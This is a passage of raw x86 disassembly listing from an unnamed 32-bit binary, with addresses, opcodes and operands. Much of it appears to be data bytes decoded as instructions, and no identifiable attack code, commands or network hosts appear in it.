  40545a:	xchg   DWORD PTR [ecx],edx
  40545c:	adc    ebx,edi
  40545e:	adc    BYTE PTR fs:[edx],dl
  405461:	sti    
  405462:	adc    BYTE PTR fs:[edx],dl
  405465:	fisub  DWORD PTR [ebp+0xf]
  405468:	adc    ebx,edx
  40546a:	gs (bad) 
  40546d:	fisttp QWORD PTR [edx-0x7d2aebea]
  405473:	push   ss
  405474:	adc    al,0xfd
  405476:	mov    dl,BYTE PTR [esi]
  405478:	adc    al,0xf5
  40547a:	adc    BYTE PTR [esi],0x14
  40547d:	cld    
  40547e:	add    BYTE PTR [eax],al
  405480:	add    BYTE PTR [eax],al
  405482:	add    BYTE PTR [ebx+0x15],ch
  405485:	adc    eax,0x151563f4
  40548a:	add    BYTE PTR [ecx],ah
  40548c:	adc    al,0x15
  40548e:	adc    eax,0x15151421
  405493:	rcl    BYTE PTR [esi+edx*1],cl
  405496:	push   ss
  405497:	ret    0x1614
  40549a:	push   ss
  40549b:	loop   0x4054b1
  40549d:	push   ss
  40549e:	push   ss
  40549f:	loop   0x4054b5
  4054a1:	push   ss
  4054a2:	push   ss
  4054a3:	rcl    DWORD PTR ds:0x15c31717,cl
  4054a9:	pop    ss
  4054aa:	pop    ss
  4054ab:	mov    ds:0xa3171715,eax
  4054b0:	adc    eax,0x16c41717
  4054b5:	sbb    BYTE PTR [eax],bl
  4054b7:	les    edx,FWORD PTR [esi]
  4054b9:	sbb    BYTE PTR [eax],bl
  4054bb:	je     0x4054db
  4054bd:	sbb    BYTE PTR [eax],bl
  4054bf:	je     0x4054df
  4054c1:	sbb    BYTE PTR [eax],bl
  4054c3:	test   BYTE PTR [esi],dl
  4054c5:	sbb    BYTE PTR [eax],bl
  4054c7:	test   BYTE PTR [esi],dl
  4054c9:	sbb    BYTE PTR [eax],bl
  4054cb:	xchg   esp,eax
  4054cc:	push   ss
  4054cd:	sbb    BYTE PTR [eax],bl
  4054cf:	xchg   esp,eax
  4054d0:	push   ss
  4054d1:	sbb    BYTE PTR [eax],bl
  4054d3:	inc    ebp
  4054d4:	sbb    eax,0x1d451919
  4054d9:	sbb    DWORD PTR [ecx],ebx
  4054db:	jne    0x4054fa
  4054dd:	sbb    DWORD PTR [ecx],ebx
  4054df:	jne    0x4054fe
  4054e1:	sbb    DWORD PTR [ecx],ebx
  4054e3:	inc    ebp
  4054e4:	sbb    eax,0x1919
  4054e9:	add    BYTE PTR [eax],al
  4054eb:	add    BYTE PTR [ebp+0x1d],al
  4054ee:	sbb    DWORD PTR [ecx],ebx
  4054f0:	push   ebp
  4054f1:	sbb    eax,0x1d551919
  4054f6:	sbb    DWORD PTR [ecx],ebx
  4054f8:	inc    esi
  4054f9:	sbb    al,0x1a
  4054fb:	sbb    al,BYTE PTR [esi+0x1c]
  4054fe:	sbb    bl,BYTE PTR [edx]
  405500:	jbe    0x40551e
  405502:	sbb    bl,BYTE PTR [edx]
  405504:	jbe    0x405522
  405506:	sbb    bl,BYTE PTR [edx]
  405508:	jne    0x40557f
  40550a:	sbb    DWORD PTR [edx],ebx
  40550c:	outs   dx,DWORD PTR ds:[esi]
  40550d:	jne    0x405528
  40550f:	sbb    bl,BYTE PTR [edi+0x65]
  405512:	sbb    DWORD PTR [edx],ebx
  405514:	pop    edi
  405515:	sbb    DWORD PTR gs:[edx],ebx
  405518:	(bad)  
  405519:	push   esp
  40551a:	sbb    BYTE PTR [ebx],bl
  40551c:	mov    ss,WORD PTR [eax+ebx*1+0x1b]
  405520:	jle    0x405526
  405522:	sbb    DWORD PTR [ebx],ebx
  405524:	jle    0x40552a
  405526:	sbb    DWORD PTR [ebx],ebx
  405528:	outs   dx,BYTE PTR ds:[esi]
  405529:	je     0x405543
  40552b:	sbb    ebp,DWORD PTR [esi+0x74]
  40552e:	sbb    BYTE PTR [ebx],bl
  405530:	pop    esi
  405531:	sbb    BYTE PTR fs:[ebx],bl
  405534:	pop    esi
  405535:	sbb    BYTE PTR fs:[ebx],bl
  405538:	xchg   ecx,eax
  405539:	imul   eax,DWORD PTR [ebx],0x0
  40553c:	jne    0x4055a8
  40553e:	add    eax,DWORD PTR [eax]
  405540:	jne    0x4055af
  405542:	add    eax,DWORD PTR [eax]
  405544:	jne    0x4055b2
  405546:	add    eax,DWORD PTR [eax]
  405548:	jne    0x4055b1
  40554a:	add    eax,DWORD PTR [eax]
  40554c:	jne    0x4055ac
  40554e:	add    eax,DWORD PTR [eax]
  405550:	add    BYTE PTR [eax],al
  405552:	add    BYTE PTR [eax],al
  405554:	add    BYTE PTR [ebp+0x69],dh
  405557:	add    eax,DWORD PTR [eax]
  405559:	jne    0x4055bb
  40555b:	add    eax,DWORD PTR [eax]
  40555d:	jne    0x4055c2
  40555f:	add    eax,DWORD PTR [eax]
  405561:	jne    0x4055c8
  405563:	add    eax,DWORD PTR [eax]
  405565:	jne    0x4055d6
  405567:	add    eax,DWORD PTR [eax]
  405569:	jne    0x4055d4
  40556b:	add    eax,DWORD PTR [eax]
  40556d:	jne    0x4055ea
  40556f:	add    eax,DWORD PTR [eax]
  405571:	jne    0x4055e2
  405573:	add    eax,DWORD PTR [eax]
  405575:	jne    0x4055da
  405577:	add    eax,DWORD PTR [eax]
  405579:	jne    0x4055d2
  40557b:	add    eax,DWORD PTR [eax]
  40557d:	jne    0x40558a
  40557f:	add    al,0x0
  405581:	jne    0x405586
  405583:	add    al,0x0
  405585:	jne    0x405589
  405587:	fld    DWORD PTR [ebx]
  405589:	jne    0x40558d
  40558b:	loope  0x405590
  40558d:	jne    0x405591
  40558f:	sub    DWORD PTR [esi*2+0x75043902],eax
  405596:	add    cl,BYTE PTR [ecx]
  405598:	add    al,0x75
  40559a:	add    bh,cl
  40559c:	add    esi,DWORD PTR [ebp+0x2]
  40559f:	imul   eax,DWORD PTR [esi*2+0x75044902],0x75042902
  4055aa:	add    cl,BYTE PTR [ecx+0x4]
  4055ad:	jne    0x4055b1
  4055af:	jmp    0xe942cab7
  4055b4:	add    esi,DWORD PTR [ebp+0x2]
  4055b7:	jmp    0x4055bf
  4055bc:	add    BYTE PTR [eax],al
  4055be:	jne    0x4055c2
  4055c0:	call   0xeb42cac8
  4055c5:	add    esi,DWORD PTR [ebp+0x2]
  4055c8:	jmp    0x7503:0xed027503
  4055cf:	add    ah,bh
  4055d1:	add    esi,DWORD PTR [ebp+0x2]
  4055d4:	loope  0x4055d9
  4055d6:	jne    0x4055da
  4055d8:	fld    QWORD PTR [ebx]
  4055da:	jne    0x4055de
  4055dc:	fld    DWORD PTR [ebx]
  4055de:	jne    0x4055e2
  4055e0:	loope  0x4055e5
  4055e2:	jne    0x4055e6
  4055e4:	leave  
  4055e5:	add    esi,DWORD PTR [ebp+0x2]
  4055e8:	mov    ecx,0x29027503
  4055ed:	add    al,0x75
  4055ef:	add    cl,BYTE PTR [ecx+0x4]
  4055f2:	jne    0x4055f6
  4055f4:	imul   eax,DWORD PTR [ebx],0x3a90275
  4055fa:	jne    0x4055fe
  4055fc:	jmp    0x6942cb05
  405601:	add    al,0x75
  405603:	add    al,BYTE PTR [eax]
  405605:	jmp    0xe940587a
  40560a:	jnp    0x40560e
  40560c:	add    cl,ch
  40560e:	sbb    bh,BYTE PTR [eax-0x1]
  405611:	jmp    0xe940588a
  405616:	jle    0x40561a
  405618:	add    cl,ch
  40561a:	jp     0x40561e
  40561c:	add    cl,ch
  40561e:	data16 add al,BYTE PTR [eax]
  405621:	jmp    0x405626
  405626:	add    BYTE PTR [esi-0x6916fffe],cl
  40562c:	add    al,BYTE PTR [eax]
  40562e:	jmp    0xe94058d9
  405633:	mov    dh,0x77
  405635:	(bad)  
  405636:	jmp    0xeb3fce11
  40563b:	jbe    0x40563b
  40563d:	jmp    ebx
  40563f:	jbe    0x405641
  405641:	add    dh,ch
  405643:	jbe    0x40564f
  405645:	add    al,dh
  405647:	jbe    0x405655
  405649:	add    dl,ah
  40564b:	jbe    0x405652
  40564d:	add    dh,bl
  40564f:	jbe    0x405662
  405651:	add    dl,bh
  405653:	jbe    0x405664
  405655:	add    BYTE PTR [edx],al
  405657:	jns    0x405670
  405659:	add    dl,cl
  40565b:	jbe    0x405688
  40565d:	add    dl,bl
  40565f:	jbe    0x40569c
  405661:	add    BYTE PTR [edx-0x76002c8a],ch
  405667:	jbe    0x40565c
  405669:	jmp    FWORD PTR [ecx+0x76]
  40566c:	mov    ds:0x63762a00,eax
  405671:	add    bl,ch
  405673:	ja     0x405677
  405675:	add    cl,ch
  405677:	jbe    0x40567b
  405679:	add    cl,bh
  40567b:	jbe    0x40568f
  40567d:	add    cl,bh
  40567f:	jbe    0x405693
  405681:	add    BYTE PTR [eax],al
  405683:	sbb    al,0x3
  405685:	adc    BYTE PTR [eax],al
  405687:	dec    esp
  405688:	add    edx,DWORD PTR [eax]
  40568a:	add    BYTE PTR [eax],al
  40568c:	add    BYTE PTR [eax],al
  40568e:	add    BYTE PTR [eax],al
  405690:	dec    ebp
  405691:	add    edx,DWORD PTR [ecx]
  405693:	add    BYTE PTR ds:0x1e001103,bh
  405699:	add    edx,DWORD PTR [edx]
  40569b:	add    BYTE PTR [esi],cl
  40569d:	add    edx,DWORD PTR [edx]
  40569f:	add    BYTE PTR [edi],cl
  4056a1:	add    edx,DWORD PTR [ebx]
  4056a3:	add    bh,bh
  4056a5:	add    dl,BYTE PTR [ebx]
  4056a7:	add    BYTE PTR [eax],bl
  4056a9:	add    edx,DWORD PTR [eax+eax*1]
  4056ac:	enter  0x1402,0x0
  4056b0:	leave  
  4056b1:	add    dl,BYTE PTR ds:0x1502c900
  4056b7:	add    ah,bl
  4056b9:	add    cl,bl
  4056bb:	add    BYTE PTR [ecx],bl
  4056bd:	add    eax,DWORD PTR [eax]
  4056bf:	add    ch,bl
  4056c1:	add    al,BYTE PTR [edx]
  4056c3:	add    bh,cl
  4056c5:	add    al,BYTE PTR [eax+eax*1]
  4056c8:	leave  
  4056c9:	add    al,BYTE PTR [edi]
  4056cb:	add    BYTE PTR [ebp-0x32fff2fe],ah
  4056d1:	add    bl,BYTE PTR [ecx]
  4056d3:	add    BYTE PTR [ebp-0x2],ch
  4056d6:	xor    BYTE PTR [eax],al
  4056d8:	int    0x2
  4056da:	popa   
  4056db:	add    BYTE PTR ds:0x9d00c0fe,bl
  4056e1:	add    eax,DWORD PTR [ecx+0xfc8d01]
  4056e7:	add    ecx,DWORD PTR [ebp+0x5d060076]
  4056ed:	or     al,BYTE PTR [ecx]
  4056ef:	or     al,0x5d
  4056f1:	adc    al,BYTE PTR [ecx]
  4056f3:	sbb    BYTE PTR [eax],al
  4056f5:	add    BYTE PTR [eax],al
  4056f7:	add    BYTE PTR [eax],al
  4056f9:	dec    ebp
  4056fa:	and    al,BYTE PTR [ecx]
  4056fc:	xor    BYTE PTR [ebp+0x42],cl
  4056ff:	add    BYTE PTR [eax+0x5c],ah
  405702:	add    al,BYTE PTR [eax]
  405704:	add    BYTE PTR [ebp+0x7b],dh
  405707:	add    edx,DWORD PTR [eax]
  405709:	jne    0x405786
  40570b:	add    edx,DWORD PTR [eax]
  40570d:	jne    0x405769
  40570f:	add    edx,DWORD PTR [ecx]
  405711:	jne    0x40576c
  405713:	add    edx,DWORD PTR [edx]
  405715:	jne    0x40576f
  405717:	add    edx,DWORD PTR [ebx]
  405719:	jne    0x40576a
  40571b:	add    edx,DWORD PTR [esi*2+0x75150376]
  405722:	ins    DWORD PTR es:[edi],dx
  405723:	add    edx,DWORD PTR [esi]
  405725:	jne    0x40579b
  405727:	add    edx,DWORD PTR [edi]
  405729:	jne    0x40579e
  40572b:	add    ebx,DWORD PTR [eax]
  40572d:	jne    0x405791
  40572f:	add    ebx,DWORD PTR [ecx]
  405731:	jne    0x405794
  405733:	add    ebx,DWORD PTR [edx]
  405735:	jne    0x405787
  405737:	add    ebx,DWORD PTR [ebx]
  405739:	jne    0x405782
  40573b:	add    ebx,DWORD PTR [esi*2+0x751d03fe]
  405742:	stos   DWORD PTR es:[edi],eax
  405743:	add    eax,DWORD PTR [eax+0x75]
  405746:	mov    ds:0xb75475e9,al
  40574b:	jmp    0x1471:0xe2bb9563
  405752:	inc    esi
  405753:	fidiv  WORD PTR [ebx+0x10]
  405756:	mov    ecx,0xb8147023
  40575b:	hlt    
  40575c:	add    BYTE PTR fs:[eax],al
  40575f:	add    BYTE PTR [eax],al
  405761:	add    BYTE PTR [ecx],dl
  405763:	dec    ebx
  405764:	out    dx,eax
  405765:	outs   dx,BYTE PTR ds:[esi]
  405766:	push   ebp
  405767:	test   al,0x23
  405769:	jb     0x40576b
  40576b:	jge    0x40575c
  40576d:	push   0x66237e10
  405772:	add    BYTE PTR [ebp-0x7b238c1c],cl
  405778:	jmp    0x3abd6aa
  40577d:	add    BYTE PTR [ebp+0x1b],dh
  405780:	inc    eax
  405781:	inc    ebx
  405782:	jne    0x405786
  405784:	or     DWORD PTR [esi+esi*4+0x2],ecx
  405788:	jmp    0xef42cc90
  40578d:	xor    ebp,0x7b
  405790:	imul   eax,DWORD PTR [ebp+0x13e901f5],0x7e697c76
  40579a:	test   DWORD PTR [ecx-0x4087ff23],0x7ef1c123
  4057a4:	ins    BYTE PTR es:[edi],dx
  4057a5:	add    DWORD PTR [ebp+0x2],esi
  4057a8:	fnstenv [ebx]
  4057aa:	cmc    
  4057ab:	shr    DWORD PTR [eax-0x7c],1
  4057ae:	jne    0x4057ba
  4057b0:	jmp    0x197aa9e0
  4057b5:	iret   
  4057b6:	jb     0x4057ba
  4057b8:	out    0x3,al
  4057ba:	mov    ds:0x32d3b932,al
  4057bf:	mov    ch,cl
  4057c1:	add    esi,DWORD PTR [ebp+0x22]
  4057c4:	adc    DWORD PTR [eax+eax*1+0x0],eax
  4057cb:	std    
  4057cc:	sub    DWORD PTR [ecx+0x4],0xe3c90275
  4057d3:	and    ch,dl
  4057d5:	shr    bl,0x72
  4057d8:	or     ch,dh
  4057da:	sti    
  4057db:	and    dh,dl
  4057dd:	mov    ch,0xf3
  4057df:	sbb    cl,BYTE PTR [edx]
  4057e1:	loope  0x4057e6
  4057e3:	jne    0x4057ef
  4057e5:	jmp    0xf13dccf5
  4057ea:	add    esi,DWORD PTR [ebp+0x2]
  4057ed:	jmp    0x4642ccf5
  4057f2:	pop    ebx
  4057f3:	dec    eax
  4057f4:	sbb    eax,0x1d407940
  4057f9:	add    cl,BYTE PTR [edx+0x55500ce9]
  4057ff:	mov    al,ds:0xc041001b
  405804:	cs daa 
  405806:	imul   esp,DWORD PTR [eax+0x40],0x5b
  40580a:	mov    ebp,0x1b649d69
  40580f:	imul   edx,ebx,0xffffff8d
  405812:	jle    0x405840
  405814:	cs sub al,0xb6
  405817:	mov    al,ds:0x22609452
  40581c:	fldcw  WORD PTR [ebp+0x108c5647]
  405822:	dec    ebp
  405823:	mov    ecx,0x496a966c
  405828:	in     eax,0xeb
  40582a:	cs mov ecx,0xc926f6
  405830:	add    BYTE PTR [eax],al
  405832:	add    BYTE PTR [eax],al
  405834:	rcl    DWORD PTR [ebx],cl
  405836:	sub    eax,0xcd75a3b4
  40583b:	fnstenv [edi+0x7e59eb29]
  405841:	stos   BYTE PTR es:[edi],al
  405842:	xlat   BYTE PTR ds:[ebx]
  405843:	pop    ss
  405844:	xchg   DWORD PTR [ebx+0x72c87439],ecx
  40584a:	mov    BYTE PTR [edi+0x7c],ch
  40584d:	lds    esp,FWORD PTR [esi+0x23d8a0da]
  405853:	test   DWORD PTR [esp+edx*1+0x76],ecx
  405857:	and    al,0x60
  405859:	sbb    DWORD PTR [eax+eax*2-0x5b81fd97],edx
  405860:	jo     0x405830
  405862:	loopne 0x4058d0
  405864:	sub    ebp,DWORD PTR [ebx+0x7e98c8]
  40586a:	xor    ebp,DWORD PTR [ebx+0x23c76da6]
  405870:	bound  ecx,QWORD PTR [eax]
  405872:	xlat   BYTE PTR ds:[ebx]
  405873:	sub    ch,cl
  405875:	imul   ecx,DWORD PTR [esi+0x47],0x720950f5
  40587c:	shl    DWORD PTR [ebx],1
  40587e:	pusha  
  40587f:	add    BYTE PTR [ebp+0x27],dh
  405882:	mov    eax,0x61ff4a7f
  405887:	int3   
  405888:	rcr    DWORD PTR [edi+ebp*2+0x75],cl
  40588c:	mov    ebx,0xe6360765
  405891:	mov    DWORD PTR [esi-0x6c],eax
  405894:	mov    cl,0xcb
  405896:	xchg   DWORD PTR [ebx+0x0],esi
  40589c:	add    bh,dl
  40589e:	pop    ebx
  40589f:	mov    dh,0x46
  4058a1:	jge    0x4058fe
  4058a3:	adc    eax,0x1adefa76
  4058a8:	mov    edx,0xc013a0da
  4058ad:	adc    edx,0xcd35ccdf
  4058b3:	push   eax
  4058b4:	in     eax,0x52
  4058b6:	lahf   
  4058b7:	push   0x8d97aef3
  4058bc:	ret    
  4058bd:	out    0x77,al
  4058bf:	sbb    eax,DWORD PTR [edx]
  4058c1:	jmp    0x405851
  4058c3:	pop    ebp
  4058c4:	xor    eax,0x77afa260
  4058c9:	push   ebx
  4058ca:	aas    
  4058cb:	jns    0x4058ff
  4058cd:	push   eax
  4058ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058cf:	(bad)  
  4058d1:	add    BYTE PTR ss:[esi+0x1beb0a7f],0x8b
  4058d9:	mov    ebx,0x98d4d978
  4058de:	inc    ebx
  4058df:	add    ebx,DWORD PTR [ebp+0x5ea6823e]
  4058e5:	div    BYTE PTR [ecx+edi*4-0x1c0c2bb7]
  4058ec:	inc    edx
  4058ed:	xor    eax,0xfa68d1a6
  4058f2:	sub    ebx,ecx
  4058f4:	pop    ecx
  4058f5:	xor    bl,ch
  4058f7:	shl    ebx,1
  4058f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058fa:	inc    eax
  4058fb:	jp     0x405891
  4058fd:	jne    0x405968
  4058ff:	mov    dh,0xbb
  405901:	add    BYTE PTR [eax],al
  405903:	add    BYTE PTR [eax],al
  405905:	add    BYTE PTR [eax+eax*2+0x7dee0286],bh
  40590c:	or     BYTE PTR [esi],dh
  40590e:	inc    edx
  40590f:	cli    
  405910:	mov    ah,0xc7
  405912:	xor    ecx,DWORD PTR [ecx+edx*8]
  405915:	arpl   di,bp
  405917:	pop    ebx
  405918:	add    eax,DWORD PTR [eax]
  40591a:	jne    0x405977
  40591c:	add    eax,DWORD PTR [eax]
  40591e:	jne    0x4058ff
  405920:	js     0x405963
  405922:	jne    0x405933
  405924:	jns    0x405967
  405926:	jne    0x405983
  405928:	add    eax,DWORD PTR [eax]
  40592a:	jne    0x40590a
  40592c:	ja     0x40596f
  40592e:	jne    0x40591c
  405930:	ja     0x405973
  405932:	jne    0x4058b6
  405934:	add    eax,DWORD PTR [eax]
  405936:	jne    0x405913
  405938:	add    BYTE PTR [eax],al
  40593a:	jne    0x40597a
  40593c:	add    eax,DWORD PTR [eax]
  40593e:	jne    0x405915
  405940:	add    al,BYTE PTR [eax]
  405942:	jne    0x4059bf
  405944:	add    al,0x0
  405946:	jne    0x40598e
  405948:	add    eax,DWORD PTR [eax]
  40594a:	jne    0x405920
  40594c:	add    al,BYTE PTR [eax]
  40594e:	jne    0x4059cb
  405950:	add    al,0x0
  405952:	jne    0x405992
  405954:	add    eax,DWORD PTR [eax]
  405956:	jne    0x405987
  405958:	add    eax,DWORD PTR [eax]
  40595a:	jne    0x405937
  40595c:	add    BYTE PTR [eax],al
  40595e:	jne    0x405966
  405960:	add    al,0x0
  405962:	jne    0x4058ea
  405964:	add    eax,DWORD PTR [eax]
  405966:	jne    0x405943
  405968:	add    BYTE PTR [eax],al
  40596a:	add    BYTE PTR [eax],al
  40596c:	add    BYTE PTR [eax],al
  40596e:	add    BYTE PTR [ebp-0x2],dh
  405971:	add    eax,DWORD PTR [eax]
  405973:	jne    0x4058f6
  405975:	add    eax,DWORD PTR [eax]
  405977:	jne    0x405954
  405979:	add    BYTE PTR [eax],al
  40597b:	jne    0x405983
  40597d:	add    al,0x0
  40597f:	jne    0x405983
  405981:	push   esi
  405982:	add    esi,DWORD PTR [ebp+0x2]
  405985:	or     DWORD PTR [esi*2+0x7503cd02],eax
  40598c:	add    ch,bl
  40598e:	add    esi,DWORD PTR [ebp+0x2]
  405991:	leave  
  405992:	lds    ebp,FWORD PTR [edx+0x71]
  405995:	lods   al,BYTE PTR ds:[esi]
  405996:	add    esi,DWORD PTR [ebp+0x2]
  405999:	call   0xe742cea1
  40599e:	add    esi,DWORD PTR [ebp+0x2]
  4059a1:	sbb    ecx,edi
  4059a3:	dec    edx
  4059a4:	jno    0x40598a
  4059a6:	add    esi,DWORD PTR [ebp+0x2]
  4059a9:	sbb    ecx,edi
  4059ab:	cmp    dh,BYTE PTR [ecx-0x1f]
  4059ae:	div    DWORD PTR [edi-0x4a7e16fe]
  4059b4:	add    dh,al
  4059b6:	add    esi,DWORD PTR [ebp+0x2]
  4059b9:	call   0xb942cec1
  4059be:	xor    DWORD PTR [ebp+0x7503ef02],0x75041102
  4059c8:	add    ah,BYTE PTR [ecx-0x4fd4a7f]
  4059ce:	add    esi,DWORD PTR [ebp+0x2]
  4059d1:	loope  0x4059d6
  4059d3:	add    BYTE PTR [eax],al
  4059d5:	add    BYTE PTR [eax],al
  4059d7:	add    BYTE PTR [ebp+0x2],dh
  4059da:	inc    ebp
  4059db:	xor    DWORD PTR ds:0x7503d902,0x7503d102
  4059e5:	add    bh,BYTE PTR [ecx-0x7f]
  4059e8:	xor    eax,0x7503f002
  4059ed:	add    dh,cl
  4059ef:	add    esi,DWORD PTR [ebp+0x2]
  4059f2:	aad    0x80
  4059f4:	xor    eax,0x7503f402
  4059f9:	add    ah,ch
  4059fb:	add    esi,DWORD PTR [ebp+0x2]
  4059fe:	add    BYTE PTR [eax+0x37000276],dh
  405a04:	mov    ds:0x76a2ffc2,eax
  405a09:	add    al,BYTE PTR [eax]
  405a0b:	push   ds
  405a0c:	xchg   ebx,eax
  405a0d:	ret    0x91ff
  405a10:	jbe    0x405a14
  405a12:	add    BYTE PTR [esi],cl
  405a14:	arpl   dx,ax
  405a16:	inc    DWORD PTR [esi+esi*2+0x5e5e0002]
  405a1d:	ret    0x73ff
  405a20:	jbe    0x405a24
  405a22:	add    BYTE PTR [edi],ch
  405a24:	dec    esi
  405a25:	ret    0x66ff
  405a28:	jno    0x405a2c
  405a2a:	add    BYTE PTR [edi+edi*1+0x7155ffc2],bh
  405a31:	add    al,BYTE PTR [eax]
  405a33:	mov    edi,0x68ffc22f
  405a38:	jbe    0x405a3c
  405a3a:	add    cl,dh
  405a3c:	add    BYTE PTR [eax],al
  405a3e:	add    BYTE PTR [eax],al
  405a40:	add    BYTE PTR [ebx],dl
  405a42:	ret    0x67ff
  405a45:	jbe    0x405a49
  405a47:	add    BYTE PTR [edi],dh
  405a49:	and    al,dl
  405a4b:	jmp    FWORD PTR [edx+0x76]
  405a4e:	add    al,BYTE PTR [eax]
  405a50:	rcl    BYTE PTR [edx],cl
  405a52:	ret    0x69ff
  405a55:	jbe    0x405a59
  405a57:	add    ch,dl
  405a59:	loop   0x405a1c
  405a5b:	jmp    FWORD PTR [esi+esi*2+0x2]
  405a5f:	add    BYTE PTR [esi-0x21],bh
  405a62:	sar    edi,0x6b
  405a65:	jbe    0x405a69
  405a67:	add    BYTE PTR [edi],dl
  405a69:	loopne 0x405a2c
  405a6b:	jmp    FWORD PTR [esi+0x76]
  405a6e:	add    al,BYTE PTR [eax]
  405a70:	leave  
  405a71:	rol    ecx,1
  405a73:	jmp    FWORD PTR [ebp+0x76]
  405a76:	add    al,BYTE PTR [eax]
  405a78:	fisub  DWORD PTR [ecx+0x24ffffc1]
  405a7e:	add    eax,DWORD PTR [eax]
  405a80:	add    BYTE PTR [edi+0x1500415e],dh
  405a86:	add    eax,DWORD PTR [eax]
  405a88:	add    BYTE PTR [ecx+0x5e],dh
  405a8b:	inc    ecx
  405a8c:	add    BYTE PTR [esi],al
  405a8e:	add    eax,DWORD PTR [eax]
  405a90:	add    BYTE PTR [edx+0x5e],al
  405a93:	inc    ecx
  405a94:	add    BYTE PTR [edi],dl
  405a96:	add    eax,DWORD PTR [eax]
  405a98:	add    BYTE PTR [ebx+0x5b],dh
  405a9b:	inc    ecx
  405a9c:	add    al,ah
  405a9e:	add    eax,DWORD PTR [eax]
  405aa0:	add    BYTE PTR [edx+0x415d],bh
  405aa6:	add    BYTE PTR [eax],al
  405aa8:	add    BYTE PTR [eax],al
  405aaa:	rol    DWORD PTR [ebx],1
  405aac:	add    BYTE PTR [eax],al
  405aae:	jle    0x405b0d
  405ab0:	inc    ecx
  405ab1:	add    dl,al
  405ab3:	push   es
  405ab4:	add    BYTE PTR [eax],al
  405ab6:	xor    BYTE PTR [eax+0x41],ah
  405ab9:	add    ch,ch
  405abb:	add    al,BYTE PTR [ecx+eax*1]
  405abe:	inc    BYTE PTR [edx]
  405ac0:	fadd   DWORD PTR [edx]
  405ac2:	inc    DWORD PTR [edx]
  405ac4:	inc    ecx
  405ac5:	add    ecx,edi
  405ac7:	add    bh,BYTE PTR ds:0x5a02ea01
  405acd:	add    ebp,esi
  405acf:	add    ah,BYTE PTR [eax+0x1]
  405ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ad3:	add    ebx,DWORD PTR [esi+0x1]
  405ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ad7:	add    esp,DWORD PTR [ecx+eax*1-0x50]
  405adb:	add    edi,DWORD PTR [ecx+0x1]
  405ade:	mov    dl,0x3
  405ae0:	jge    0x405ae3
  405ae2:	inc    ebx
  405ae3:	add    edi,DWORD PTR [ebx+0x1]
  405ae6:	popf   
  405ae7:	add    eax,DWORD PTR ds:0xdb039e01
  405aed:	add    cl,BYTE PTR [edi-0x16febdfd]
  405af3:	add    bh,BYTE PTR [esi]
  405af5:	add    edx,ebp
  405af7:	add    bl,BYTE PTR [ebx+0x1]
  405afa:	jne    0x405a8c
  405afc:	add    eax,edi
  405afe:	ja     0x405a92
  405b00:	add    esp,DWORD PTR [ecx+0x74]
  405b03:	add    DWORD PTR [ebx],0x5f
  405b06:	je     0x405a8c
  405b08:	add    esp,DWORD PTR [ebp+0x74]
  405b0b:	cmc    
  405b0c:	add    bh,BYTE PTR [edx+0x0]
  405b0f:	add    BYTE PTR [eax],al
  405b11:	add    BYTE PTR [eax],al
  405b13:	je     0x405af3
  405b15:	add    bl,ch
  405b17:	ja     0x405b00
  405b19:	add    bh,BYTE PTR [esi+0x74]
  405b1c:	rol    BYTE PTR [edx],1
  405b1e:	jl     0x405b94
  405b20:	sbb    DWORD PTR [ebx],eax
  405b22:	push   esp
  405b23:	je     0x405b3d
  405b25:	add    eax,DWORD PTR [edx]
  405b27:	je     0x405b47
  405b29:	add    edi,DWORD PTR [ecx]
  405b2b:	je     0x405b52
  405b2d:	add    eax,DWORD PTR [esi]
  405b2f:	je     0x405b54
  405b31:	add    ecx,DWORD PTR [esp+esi*2]
  405b34:	and    DWORD PTR [ebx],eax
  405b36:	sbb    BYTE PTR [edi+esi*4+0x2],dh
  405b3a:	sbb    dh,BYTE PTR [esp+ebx*4+0x2]
  405b3e:	push   cs
  405b3f:	je     0x405aec
  405b41:	add    dl,BYTE PTR [eax]
  405b43:	je     0x405aef
  405b45:	add    al,BYTE PTR [ebx+0x74]
  405b48:	mov    DWORD PTR [edx],eax
  405b4a:	inc    edi
  405b4b:	je     0x405ae3
  405b4d:	add    dl,BYTE PTR [eax+0x74]
  405b50:	xchg   ebx,eax
  405b51:	add    bl,BYTE PTR [eax+0x74]
  405b54:	xchg   edx,eax
  405b55:	add    ch,BYTE PTR [esi+0x74]
  405b58:	inc    eax
  405b59:	add    dh,BYTE PTR [eax+0x74]
  405b5c:	lods   eax,DWORD PTR ds:[esi]
  405b5d:	add    ah,BYTE PTR [edx+0x74]
  405b60:	jnp    0x405b64
  405b62:	push   ebp
  405b63:	je     0x405bdd
  405b65:	add    al,BYTE PTR [ebx]
  405b67:	je     0x405be7
  405b69:	add    bh,BYTE PTR [edx]
  405b6b:	je     0x405af2
  405b6d:	add    al,BYTE PTR [edi]
  405b6f:	je     0x405af4
  405b71:	add    cl,BYTE PTR ds:0x19028174
  405b77:	add    BYTE PTR [eax],al
  405b79:	add    BYTE PTR [eax],al
  405b7b:	add    BYTE PTR [edx+eax*1+0x55],dh
  405b7f:	add    bl,BYTE PTR [esi+0x3]
  405b82:	dec    esi
  405b83:	add    ch,BYTE PTR [edx+0x3]
  405b86:	pop    ecx
  405b87:	add    al,BYTE PTR [ebx+eax*1+0x3310258]
  405b8e:	cmp    eax,DWORD PTR [edx]
  405b90:	sub    eax,0x44023403
  405b95:	add    esi,DWORD PTR [ecx]
  405b97:	add    ch,BYTE PTR [ebx+eax*1]
  405b9a:	xor    BYTE PTR [edx],al
  405b9c:	sbb    al,BYTE PTR [ebx]
  405b9e:	and    al,BYTE PTR [edx]
  405ba0:	add    al,0x3
  405ba2:	pop    ds
  405ba3:	add    dl,BYTE PTR [esi]
  405ba5:	add    edx,DWORD PTR [esi]
  405ba7:	add    cl,BYTE PTR [eax+eax*1+0x48]
  405bab:	add    eax,0x54f0393
  405bb0:	cdq    
  405bb1:	add    edx,DWORD PTR [eax+0x5]
  405bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bb5:	add    eax,DWORD PTR [edx+0x5]
  405bb8:	jae    0x405bbd
  405bba:	cmp    eax,0x98038105
  405bbf:	add    bl,BYTE PTR [edx-0x6ffd68fd]
  405bc5:	add    edx,DWORD PTR [eax-0x6dfc9bfe]
  405bcb:	add    cl,BYTE PTR [edx+0x68028503]
  405bd1:	add    esp,DWORD PTR [edx+eax*1+0x2af036f]
  405bd8:	jge    0x405bdd
  405bda:	xchg   esp,eax
